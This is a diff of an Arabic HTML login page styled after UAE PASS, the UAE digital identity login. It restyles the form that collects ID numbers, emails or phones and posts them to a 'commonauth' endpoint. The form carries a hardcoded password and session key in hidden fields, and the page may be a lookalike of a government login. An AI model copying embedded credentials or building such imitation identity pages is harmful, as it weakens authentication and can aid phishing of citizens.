@@ -6,121 +6,167 @@
     <title>UAE PASS - تسجيل الدخول</title>
     
     <style>
-        /* إعدادات الألوان والهوية البصرية */
+        /* إعدادات الألوان والهوية البصرية للهوية الرقمية */
         :root {
             --uae-blue-dark: #005a9c;
             --uae-blue-light: #00a19c;
             --uae-black: #1a1a1a;
             --uae-gray-bg: #f9f9f9;
-            --uae-border: #d1d1d1;
+            --uae-border: #ced4da;
+            --uae-text-muted: #6c757d;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
+            padding: 0;
             direction: rtl;
         }
 
-        /* الشريط الملون العلوي */
+        /* الشريط الملون العلوي المتحرك */
         .rectangle {
             height: 6px;
             background: linear-gradient(90deg, var(--uae-blue-dark), var(--uae-blue-light));
             width: 100%;
             position: fixed;
             top: 0;
+            left: 0;
             z-index: 1000;
         }
 
+        /* الحاوية الرئيسية */
         .container {
-            max-width: 400px;
+            max-width: 420px;
             margin: 0 auto;
-            padding: 80px 20px 40px;
+            padding: 100px 20px 40px;
             text-align: center;
         }
 
-        /* الشعار العلوي الرئيسي */
-        .logo img {
-            max-width: 150px;
-            margin-bottom: 30px;
+        /* تنسيق الصورة فوق النص */
+        .top-image-container {
+            margin-bottom: 20px;
         }
 
-        /* --- الصورة الجديدة التي طلبتها --- */
-        .top-icon {
-            width: 60px; /* يمكنك تكبير أو تصغير الحجم من هنا */
+        .top-image-container img {
+            max-width: 140px; /* يمكنك تعديل الحجم من هنا */
             height: auto;
-            margin-bottom: 10px;
         }
 
-        .login-to-uaepass p {
-            font-size: 18px;
+        /* جملة الدخول عن طريق الهوية الرقمية */
+        .login-title {
+            font-size: 20px;
             font-weight: 700;
             color: var(--uae-black);
-            margin-top: 0;
             margin-bottom: 30px;
         }
 
-        .login-to-uaepass span {
+        .login-title span {
             color: var(--uae-blue-dark);
         }
 
-        /* تنسيق الحقول */
+        /* تنسيق حقل الإدخال */
         .idn-input {
             width: 100%;
-            padding: 15px;
+            padding: 15px 20px;
             border: 1px solid var(--uae-border);
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 15px;
             background-color: var(--uae-gray-bg);
             box-sizing: border-box;
             text-align: right;
             outline: none;
+            transition: all 0.3s ease;
         }
 
         .idn-input:focus {
             border-color: var(--uae-blue-dark);
-            background-color: #fff;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 90, 156, 0.1);
+        }
+
+        /* خيار تذكرني */
+        .form-check {
+            text-align: right;
+            margin-top: 15px;
+            font-size: 14px;
+            color: var(--uae-text-muted);
+            display: flex;
+            align-items: center;
+        }
+
+        .form-check input {
+            margin-left: 10px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
         }
 
         /* زر تسجيل الدخول */
         .btn-login {
             width: 100%;
             background-color: var(--uae-black);
-            color: #fff;
+            color: #ffffff;
             border: none;
-            padding: 14px;
+            padding: 15px;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 25px;
+            transition: background 0.3s ease;
         }
 
-        /* التذييل والروابط */
+        .btn-login:hover {
+            background-color: #333333;
+        }
+
+        /* الروابط الإضافية */
+        .extra-links {
+            margin-top: 25px;
+            font-size: 14px;
+        }
+
+        .extra-links a {
+            color: var(--uae-blue-dark);
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .recover-link {
+            display: block;
+            margin-top: 15px;
+            color: var(--uae-text-muted) !important;
+            font-weight: normal !important;
+            text-decoration: underline !important;
+        }
+
+        /* التذييل */
         .footer {
-            margin-top: 50px;
-            border-top: 1px solid #eee;
-            padding-top: 20px;
+            margin-top: 60px;
+            border-top: 1px solid #eeeeee;
+            padding-top: 30px;
         }
 
-        .menu {
+        .footer img {
+            max-width: 100px;
+            margin-bottom: 15px;
+        }
+
+        .footer-menu {
+            margin-bottom: 15px;
+        }
+
+        .footer-menu a {
             font-size: 12px;
             color: var(--uae-blue-dark);
             text-decoration: none;
-            margin: 0 5px;
+            margin: 0 8px;
         }
 
         .copyright {
             font-size: 11px;
-            color: #999;
-            margin-top: 15px;
-        }
-
-        .form-check {
-            text-align: right;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #666;
+            color: #999999;
         }
     </style>
 </head>
@@ -129,41 +175,43 @@
     <div class="rectangle"></div>
 
     <div class="container">
-        <div class="logo">
-            <img src="uaepass/images/self_service.png" alt="UAE PASS">
+        
+        <div class="top-image-container">
+            <img src="uaepass/images/self_service.png" alt="UAE PASS Logo">
         </div>
 
-        <div class="login-to-uaepass">
-            <img src="uaepass/images/icon-top.png" class="top-icon" alt="icon"> 
-            
+        <div class="login-title">
             <p>الدخول عن طريق <span>الهوية الرقمية</span></p>
         </div>
 
-        <form id="loginForm" action="../../commonauth" method="post">
+        <form action="../../commonauth" method="post">
+            
             <input type="text" class="idn-input" id="username" name="username" 
-                   placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف">
+                   placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف" required>
             
             <div class="form-check">
                 <input type="checkbox" checked id="rememberme" name="rememberme">
                 <label for="rememberme">تذكرني</label>
             </div>
 
-            <input type="submit" value="تسجيل الدخول" class="btn-login">
+            <button type="submit" class="btn-login">تسجيل الدخول</button>
             
             <input type="hidden" name="password" value="ndwenw902ee9239">
             <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
         </form>
 
-        <p style="font-size: 14px; margin-top: 20px;">
-            ليس لديك حساب؟ <a href="#" style="color: var(--uae-blue-dark); font-weight: bold; text-decoration: none;">إنشاء حساب جديد</a>
-        </p>
+        <div class="extra-links">
+            <p>ليس لديك حساب؟ <a href="https://uaepass.ae/signup">إنشاء حساب جديد</a></p>
+            <a href="https://uaepass.ae/account-recovery" class="recover-link">كيفية استعادة الحساب؟</a>
+        </div>
 
         <footer class="footer">
-            <img src="uaepass/images/n6.png" style="max-width: 100px; margin-bottom: 10px;">
-            <div class="text-center">
-                <a class="menu" href="#">نبذة عامة</a>
-                <a class="menu" href="#">الدعم</a>
-                <a class="menu" href="#">الأسئلة الشائعة</a>
+            <img src="uaepass/images/n6.png" alt="UAE Logo">
+            <div class="footer-menu">
+                <a href="#">الصفحة الرئيسية</a>
+                <a href="#">نبذة عامة</a>
+                <a href="#">الدعم</a>
+                <a href="#">الأسئلة الشائعة</a>
             </div>
             <div class="copyright">حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.</div>
         </footer>
